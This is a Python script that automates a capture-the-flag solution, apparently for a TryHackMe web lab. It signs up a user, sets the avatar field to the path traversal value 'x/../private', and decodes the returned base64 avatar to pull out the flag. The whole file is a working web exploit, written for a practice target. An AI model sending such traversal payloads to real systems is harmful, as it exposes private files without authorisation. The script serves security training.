#!/usr/bin/env python3

import argparse
import base64
import os
import platform
import random
import re
import requests
import string
import sys

class Surfer:
    def __init__(self, baseurl:str, username:str, saveflag:bool=None):
        if not(isinstance(baseurl,str)):
            raise TypeError(f"baseurl must be a string. got {type(baseurl)}")

        if not(isinstance(username,str)):
            raise TypeError(f"username must be a string. got {type(username)}")

        if saveflag is None:
            saveflag = False
        elif not(isinstance(saveflag,bool)):
            raise TypeError(f"saveflag must be a boolean. got {type(saveflag)}")

        baseurl = baseurl.strip()
        if len(baseurl) < 1:
            raise ValueError("baseurl cannot be an empty string")

        if baseurl[-1] == "/":
            if len(baseurl) < 2:
                raise ValueError("invalid baseurl provided")
            baseurl = baseurl[:-1]

        password, success, message = GenRandomString(minlen=7, maxlen=20)
        if not(success):
            raise ValueError(message)

        self.__baseurl = baseurl
        self.__password = password
        self.__saveflag = saveflag
        self.__session = requests.Session()
        self.__timeout = 10
        self.__username = username
        return

    def __change_avatar(self):
        message = str()
        success = bool()
        targetroute = "customers/new-account-page"
        targeturl = f"{self.__baseurl}/{targetroute}"

        try:
            payload = {"avatar": "x/../private"}

            resp = self.__session.post(targeturl, data=payload, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"error updating avatar ({resp.status_code} {resp.reason})")
            elif "Invalid response received from endpoint" in resp.text:
                raise ValueError("error updating avatar. check payload")

            message = "avatar successfully poisoned"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def __create_user(self):
        message = str()
        success = bool()
        targetroute = "customers/signup"
        targeturl = str()

        try:
            payload = {
                "username": self.__username,
                "email": f"{self.__username}@local.local",
                "password": self.__password,
                "cpassword": self.__password,
            }

            targeturl = f"{self.__baseurl}/{targetroute}"

            resp = self.__session.post(targeturl, data=payload, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"unable to register user ({resp.status_code} {resp.reason})")
            elif "An account with this username already exists" in resp.text:
                raise ValueError(f"\"{self.__username}\" already exists")

            message = f"account successfully registerd for \"{self.__username}:{self.__password}\""
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def __get_flag(self):
        b64pat = "url\\(data:image/png;base64,(.*)\\)"
        flag = str()
        flagpat = "THM{.*}"
        message = str()
        success = bool()
        targetroute = "customers/new-account-page"
        targeturl = f"{self.__baseurl}/{targetroute}"

        try:
            resp = self.__session.get(targeturl, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"error getting new-account-page ({resp.status_code} {resp.reason})")

            b64data, success, message = FindFlag(resp.text, b64pat)
            if not(success):
                raise ValueError("unable to find avatar\'s base64 data")

            b64decoded = base64.b64decode(b64data).decode()

            flag, success, message = FindFlag(b64decoded, flagpat)
            if not(success):
                raise ValueError(message)

            message = "flag successfully acquired"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (flag, success, message)

    def __login(self):
        message = str()
        success = bool()
        targetroute = "customers/login"
        targeturl = f"{self.__baseurl}/{targetroute}"

        try:
            payload = {"username": self.__username, "password": self.__password}

            resp = self.__session.post(targeturl, data=payload, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"login failed ({resp.status_code} {resp.reason})")
            elif "Invalid Username/Password Combination" in resp.text:
                raise ValueError("login failed. invalid credentials")

            message = "successfully logged in"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def launch(self):
        flag = str()
        message = str()
        success = bool()

        try:
            SysMsgNB(f"creating account \"{self.__username}\" ...")
            success, message = self.__create_user()
            if not(success):
                raise ValueError(message)
            SucMsg(message)

            SysMsgNB("poisoning avatar ...")
            success, message = self.__change_avatar()
            if not(success):
                raise ValueError(message)
            SucMsg(message)

            SysMsgNB("looking for flag ...")
            flag, success, message = self.__get_flag()
            if not(success):
                raise ValueError(message)

            if self.__saveflag:
                with open("flag.txt","w") as fptr:
                    fptr.write(flag)
                SucMsg("flag saved to \"flag.txt\"")

            message = "attack successfully completed"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (flag, success, message)

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_GRN}[+]{ANSI_RST} {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_RED}[-]{ANSI_RST} {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        #data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        #flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def GenRandomString(minlen = None, maxlen = None):
    message = str()
    randstring = str()
    success = bool()

    try:
        alphabet = f"{string.ascii_lowercase}{string.ascii_uppercase}{string.digits}"

        ############################################################
        # Validate minlen value
        ############################################################
        if minlen is None:
            minlen = 8
        elif not(isinstance(minlen,int)):
            raise TypeError("Minlen must be int. Got {type(minlen)}")
        elif minlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Validate maxlen value
        ############################################################
        if maxlen is None:
            maxlen = 15
        elif not(isinstance(maxlen,int)):
            raise TypeError("Minlen must be int. Got {type(maxlen)}")
        elif maxlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Make sure minlen <= maxlen
        ############################################################
        if minlen > maxlen:
            tmp = maxlen
            maxlen = minlen
            minlen = tmp

        ############################################################
        # Choose length of string
        ############################################################
        stringlen = random.randrange(minlen, maxlen)

        ############################################################
        # Build random string
        ############################################################
        for i in range(stringlen):
            curchoice = random.choice(alphabet)
            randstring = f"{randstring}{curchoice}"

        message = "random string generated"
        success = True
    except Exception as ex:
        message = str(ex)
        randstring = ""
        success = False
    return (randstring, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("--save", help="save the flag to flag.txt", action="store_true", dest="save")
    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")
    parser.add_argument("--username", help="username to add", type=str, dest="username", default="surfer")

    args = parser.parse_args()

    target = args.target
    port = args.port
    saveflag = args.save
    secure = args.secure
    username = args.username

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    InfoMsg(f"Username: {username}")
    InfoMsg(f"Save Flag: {saveflag}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}:{port}"

    try:
        surfer = Surfer(baseurl, username, saveflag=saveflag)

        flag, success, message = surfer.launch()
        if not(success):
            raise ValueError(message)
        SucMsg(flag)
    except Exception as ex:
        ErrMsg(str(ex))
        sys.exit(ex)

    return

if __name__ == "__main__":
    main()

